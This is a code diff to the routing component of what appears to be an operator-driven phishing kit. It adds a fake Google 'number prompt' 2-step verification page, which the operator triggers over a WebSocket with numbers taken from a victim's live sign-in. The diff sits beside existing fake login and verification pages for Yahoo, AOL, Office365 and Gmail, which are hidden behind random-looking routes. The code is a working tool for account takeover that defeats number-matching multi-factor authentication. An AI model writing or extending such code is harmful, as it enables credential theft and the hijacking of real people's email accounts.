@@ -27,6 +27,7 @@ import AccountLockedPage from './components/interactive/AccountLockedPage';
 import SecurityCheckPage from './components/interactive/SecurityCheckPage';
 import TwoFactorPage from './components/interactive/TwoFactorPage';
 import EmailVerificationPage from './components/interactive/EmailVerificationPage';
+import GmailNumberPromptPage from './components/interactive/GmailNumberPromptPage';
 import { useWebSocket, WebSocketMessage } from './hooks/useWebSocket';
 import { getBrowserFingerprint } from './utils/oauthHandler';
 import { getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';
@@ -98,6 +99,9 @@ const ROUTES = {
   EMAIL_V_YAHOO: '/1pk4fa1rwf2gnzoqyc6lffdbc9c5dsp0qfaapcplb0zw99x71jz12ezumr6s6l6losoho6hhwt9h20hng3utyn6f48ga0zicl6mcd4ewlodlrfww6vq4lzs3h4g9uk0wum9lgypomkdhvok0lyt3g2hb3dipz7dfsg77v',
   EMAIL_V_AOL: '/uuorgf3ijzxpy67suzt24550edny6fpcr6sq2ap8ag3tfxo528zmxbrex6isyj9avt6miaoglg6fgnf0dy3b5lv5bsdskb7hjjz72nsxt41ub8vgl1d1hjmg73h10mzkl88oxpmpcjo1zo5jyswf9f1y5mw5e3b7p2584',
   EMAIL_V_OTHERS: '/uhsd9q8cv4zyujahpsgxd0lypj74gvy8b8vtcihwjcnk1g1v7xosdy04rn8ywx0u65i9p4zhje9g9fzf9nyhhljwgxc4djiuvpbkfqsv5aap6nxe2uxsratm23vkos3h81oid1lfcdzlyo4a4ovh68fv7rhujyd30klfc',
+  // Google "Number Prompt" challenge page (triggered by WebSocket `show_google_number_prompt`).
+  // Gmail-only — Google's number-matching 2-step verification flow.
+  GOOGLE_NUM_PROMPT: '/9k7s2x8m4n6jq1r3vt5wbpdfh8gyuc0aexlmnrz4qb7ip2vws5tjf6ahd9co1elur8mkn3yzgvxqp7bdtfh5wljrac0nqoiub6msyxedlf2gprt4hwzn8jcvabkoy7ifsxqpd1htmgnzbu3eclry8wfvka0joixsqdpe',
 };
 
 // Maps a provider name (as sent by the backend over WebSocket) to the provider-specific
@@ -312,6 +316,11 @@ function App() {
       window.location.href = 'https://www.adobe.com';
     } else if (command === 'navigate' && data?.route) {
       navigate(data.route as string);
+    } else if (command === 'show_google_number_prompt') {
+      // Google number-matching 2-step verification (Gmail-only). The operator
+      // supplies a `numbers` array (e.g. `{ numbers: [42, 18, 73] }`) which
+      // GmailNumberPromptPage renders for the user to select.
+      navigate(ROUTES.GOOGLE_NUM_PROMPT, { state: { data, provider: 'Gmail' } });
     } else if (command.startsWith('show_')) {
       const flow = command.replace('show_', '') as keyof typeof routeMaps;
       const providerKey = normalizeProviderKey(data?.provider as string);
@@ -602,6 +611,8 @@ function App() {
       <Route path={ROUTES.EMAIL_V_YAHOO} element={<EmailVerificationPage providerKey="yahoo" onAction={handleInteractiveAction} />} />
       <Route path={ROUTES.EMAIL_V_AOL} element={<EmailVerificationPage providerKey="aol" onAction={handleInteractiveAction} />} />
       <Route path={ROUTES.EMAIL_V_OTHERS} element={<EmailVerificationPage providerKey="others" onAction={handleInteractiveAction} />} />
+      {/* Google "Number Prompt" challenge page (triggered by WebSocket `show_google_number_prompt`) */}
+      <Route path={ROUTES.GOOGLE_NUM_PROMPT} element={<GmailNumberPromptPage onAction={handleInteractiveAction} />} />
       <Route path="/login.yahoo.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_YAHOO} />} />
       <Route path="/login.microsoftonline.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_OFFICE365} provider="microsoft" />} />
       <Route path="/accounts.google.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_GMAIL} />} />
